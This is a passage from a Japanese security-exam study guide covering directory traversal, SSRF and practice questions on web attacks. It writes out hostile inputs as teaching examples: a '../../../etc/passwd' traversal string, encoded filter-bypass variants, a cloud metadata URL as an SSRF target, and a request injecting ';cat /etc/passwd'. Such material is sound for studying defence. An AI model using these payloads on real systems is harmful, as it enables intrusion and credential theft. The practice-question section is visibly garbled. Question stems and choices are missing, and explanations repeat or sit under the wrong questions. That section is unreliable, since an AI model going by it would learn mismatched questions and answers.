例えば、外部から受け取ったファイル名を用いて、特定のディレクトリ（例：`/var/www/data/`）内のファイルを開くWebアプリケーションがあるとする。この場合、次のようなファイル名を要求すると、別のディレクトリにある任意のファイルを開ける可能性がある（`/etc/passwd`が存在し、このプログラムにアクセス権がある場合）。

```
../../../etc/passwd
```

#### ディレクトリトラバーサル攻撃への対策

外部から受け取った文字列を用いてWebサーバ内のファイルにアクセスするのは、非常に危険である。Webアプリケーションの仕様を見直し、そうした処理を取りやめることが確実な対策となる。それができない場合は、次のような対策をとる。

- パス名からファイル名のみを取り出す`basename()`などのコマンドや関数を使用し、文字列からディレクトリ名を取り除く
- Webサーバ内のファイルへのアクセス権を正しく設定する
- ファイル名を指定した文字列に「`/`」「`../`」「`..\`」などが含まれていないかをチェックし、含まれていた場合はエラー処理を行う

なお、文字列のチェックでは、次のようにエンコードされた文字列がすり抜け、有効なパスとして解釈されてしまう場合があるので注意が必要である。

| 種別 | 文字列の例 |
| --- | --- |
| URLエンコード | `%2F`、`..%2F`、`..%5C` |
| 二重エンコード | `%252F`、`..%252F`、`..%255C` |

> **補足**：`%2F`は「`/`」、`%5C`は「`\`」をURLエンコードしたものである。`%25`は「`%`」自体をエンコードしたもので、デコードが2回行われると`%252F`→`%2F`→`/`となる。チェックは、デコードと正規化を済ませた後の文字列に対して行うことが重要である。

### 2.8.8 サーバサイドリクエストフォージェリ（SSRF）

SSRF（Server Side Request Forgery）とは、外部からアクセス可能なWebサーバなどの公開サーバを踏み台にする攻撃である。攻撃者は、公開サーバから、本来外部から直接アクセスできない内部サーバなどに対して、不正なリクエストを送信させる。

#### SSRFの脆弱性と攻撃の例

攻撃対象となる内部サーバなどと公開サーバには信頼関係があり、内部サーバは公開サーバからの何らかのリクエストを処理して応答する仕組みになっている。このとき、内部サーバなどが次のような確認を怠っていると、SSRFを許す脆弱性となる可能性がある。

- 公開サーバからのリクエスト内容を、セキュリティが担保されるよう厳格に制限する
- リクエストの正当性を十分確認する

攻撃者はこうした脆弱性を悪用し、公開サーバを通じて不正なリクエストを内部サーバなどに送り付ける。これにより、認証情報や機密情報を入手したり、本来はアクセスできないシステムリソースにアクセスしたりできる。

前述のSQLインジェクションも、Webサーバを通じて内部のDBサーバで不正な処理を実行することから、SSRFの一種といえる。そのほか、OSコマンドインジェクションやディレクトリトラバーサルの脆弱性がSSRFに悪用される場合もある。

> **試験対策メモ**：情報処理安全確保支援士試験の午後問題では、SSRFを題材にした脆弱性とその対策や、Webアプリケーションに存在するXSSなどの脆弱性とその対策が出題されている。

**図：SSRFのイメージ**

```
攻撃者 ──①悪意ある文字列を含むリクエスト──▶ 公開サーバ
                                               │
                                               │ ②攻撃者の悪意あるリクエストを送信
                                               ▼
                                          内部サーバ等 ──▶ ③不正な処理の実行・情報の漏えい

※本来直接アクセスできない内部サーバ等に対し、公開サーバを介して不正なリクエストを送信
```

> **補足**：クラウド環境では、インスタンス内部からのみアクセスできるメタデータサービス（例：`http://169.254.169.254/`）がSSRFの標的となりやすい。ここからクラウドの認証情報が窃取される事例も発生している。

#### SSRFへの対策

- 公開サーバから内部サーバなどへのリクエスト内容に、想定外の値が含まれていないかを厳格にチェックする
- 公開サーバがアクセスできる宛先（ホスト名、IPアドレス、ポート、スキーム）を許可リスト方式で限定する
- 内部サーバ側でも、公開サーバからのリクエストの正当性を検証する

SQLインジェクション、OSコマンドインジェクション、ディレクトリトラバーサルの脆弱性はSSRFの脆弱性にもなるため、それらにも対処する必要がある。

#### 問題1

クリックジャッキング攻撃に有効な対策はどれか。

- ア　cookieに、HttpOnly属性を設定する。
- イ　cookieに、Secure属性を設定する。
- ウ　HTTPレスポンスヘッダーに、Strict-Transport-Securityを設定する。
- エ　HTTPレスポンスヘッダーに、X-Frame-Optionsを設定する。

〔情報処理安全確保支援士試験・R4・午前Ⅱ〕

**●解答・解説**

クリックジャッキング攻撃とは、Webページのコンテンツ上に、iframeなどで透明化した標的サイトのコンテンツを配置し、利用者を騙して不正な操作を実行させる攻撃手法である。

この攻撃への有効な対策の一つは、Webサイト側がHTTPレスポンスヘッダーにX-Frame-Optionsを設定することである。X-Frame-Optionsは、frame又はiframeでページを表示してよいかどうかを指定する仕組みである。

- 「DENY」を設定すると、frame又はiframeでページを表示することを一切禁止する。
- 「SAMEORIGIN」を指定すると、アドレスバーに表示されたドメインと同じドメインの場合のみ許可する。

したがって**エ**が正解。

- ア：HttpOnly属性は、JavaScriptからのcookieの読取りを禁止するもので、XSSによるcookie窃取への対策である。
- イ：Secure属性は、HTTPS通信の場合のみcookieを送信させるもので、盗聴対策である。
- ウ：Strict-Transport-Security（HSTS）は、ブラウザにHTTPSでの接続を強制させるもので、中間者攻撃やSSLストリッピングへの対策である。

Webアプリケーションソフトウェアの脆弱性を悪用する攻撃手法のうち、入力した文字列がPerlのexec関数などに渡されることを利用し、不正にシェルスクリプトを実行させるものは、どれに分類されるか。

**●解答・解説**

- ア：HTTPヘッダインジェクションは、HTTPヘッダ内に不正なデータを入力することで、任意のヘッダフィールドやメッセージボディを追加したり、レスポンスを分割したりする攻撃手法である。
- ウ：クロスサイトリクエストフォージェリは、ログイン中の利用者に、罠サイトなどを経由して意図しないリクエストを標的サイトへ送信させる攻撃手法である。
- エ：セッションハイジャックは、セッションIDを盗聴・推測するなどして、正規の利用者になりすます攻撃手法である。

SQLインジェクションとは、ユーザの入力データを基にSQL文を編集してDBにクエリを発行し、その結果を返す仕組みのWebページにおいて、不正なSQL文を入力する攻撃手法である。これにより、DBを改ざんしたり、DBに登録された個人情報などを不正に取得したりする。SQLインジェクション対策には次のようなものがある。

- ユーザの入力データ中に含まれる、SQL文として意味をもつ文字をエスケープ処理する

〈Webアプリケーションの実装以外の対策〉

- クライアントに送るWebサーバのエラーメッセージを必要最小限にする
- DBのアカウントがもつDBアクセス権限を必要最小限にする
- Webアプリケーションファイアウォール（WAF）を導入する

※変数部分にプレースホルダと呼ばれる特殊文字（「?」など）を使用してSQL文の雛形をあらかじめ用意しておき、後からそこに実際の値を割り当ててSQL文を完成させる方法。

したがって**エ**が正解。

- イ：セッションハイジャックへの対策である。
- ウ：ディレクトリトラバーサル攻撃への対策である。

〔情報処理安全確保支援士試験・R3・午前Ⅱ〕

**●解答・解説**

SQLインジェクションとは、ユーザの入力値を基にDBにSQL命令を発行する仕組みのWebアプリケーションにおいて、不正なSQL命令を混入させ、データを改ざんしたり不正に取得したりする攻撃手法である。SQLインジェクションを防ぐには、DBのバインド機構を利用するのが有効である。

バインド機構とは、変数部分にプレースホルダと呼ばれる特殊文字（「?」など）を使用してSQL文の雛形をあらかじめ用意し、後からそこに実際の値を割り当ててSQL文を完成させる方法である。割り当てられる変数は完全な数値定数又は文字列定数として扱われる。そのため、変数の中にSQL文として特別な意味をもつ文字が含まれていても、それらは自動的にエスケープ処理され、単なる文字として認識される。

したがって**ア**が正解。

- イ：外部サイトのスタイルシートを任意に取り込めるようにすると、スタイルシートを悪用した攻撃を招くため、XSS対策としては不適切である。
- ウ：CSRF対策としては、重要な処理にはPOSTメソッドを用い、トークンを埋め込むなどの方法をとる。
- エ：セッションIDは推測困難な値とし、ログイン時などに再発行すべきである。固定のIDはセッションハイジャックやセッションフィクセーションを招く。

#### 問題5

ディレクトリトラバーサル攻撃はどれか。

- イ　SQL文のリテラル部分の生成処理に問題があるアプリケーションに対して、攻撃者が、任意のSQL文を渡して実行する。
- ウ　シングルサインオンを提供するディレクトリサービスに対して、攻撃者が、不正に入手した認証情報を用いてログインし、複数のアプリケーションを不正使用する。
- エ　入力文字列からアクセスするファイル名を組み立てるアプリケーションに対して、攻撃者が、上位のディレクトリを意味する文字列を入力して、非公開のファイルにアクセスする。

- ア：OSコマンドインジェクションの説明である。
- イ：SQLインジェクションの説明である。
- ウ：不正ログイン（なりすまし）の説明であり、ディレクトリトラバーサル攻撃ではない。

#### 問題6

Webサーバのログを分析したところ、Webサーバへの攻撃と思われるHTTPリクエストヘッダが記録されていた。次のHTTPリクエストヘッダから推測できる、攻撃者が悪用しようとしている可能性が高い脆弱性はどれか。ここで、HTTPリクエストヘッダ中の"%20"は空白を意味する。

［HTTPリクエストヘッダの部分］

```http
GET /cgi-bin/submit.cgi?user=;cat%20/etc/passwd HTTP/1.1
Accept: */*
Accept-Language: ja
UA-CPU: x86
Accept-Encoding: gzip, deflate
User-Agent: (省略)
Host: test.example.com
Connection: Keep-Alive
```

- ア　HTTPヘッダインジェクション（HTTP Response Splitting）
- イ　OSコマンドインジェクション
- ウ　SQLインジェクション
- エ　クロスサイトスクリプティング

〔情報処理安全確保支援士試験・R4春・午前Ⅱ〕

**●解答・解説**

HTTPリクエストヘッダの「`?user=;cat%20/etc/passwd`」は、コマンドの区切りを意味する「`;`」に続けて、OSコマンドである「`cat`」で「`/etc/passwd`」ファイルを表示しようとしている。このことから、攻撃者が悪用しようとしている脆弱性はOSコマンドインジェクションである。したがって**イ**が正解。

> **補足**：`/etc/passwd`はUNIX系OSのユーザアカウント情報を格納するファイルである。OSコマンドインジェクションやディレクトリトラバーサルの攻撃が成功したかを確認する目的で、しばしば標的となる。
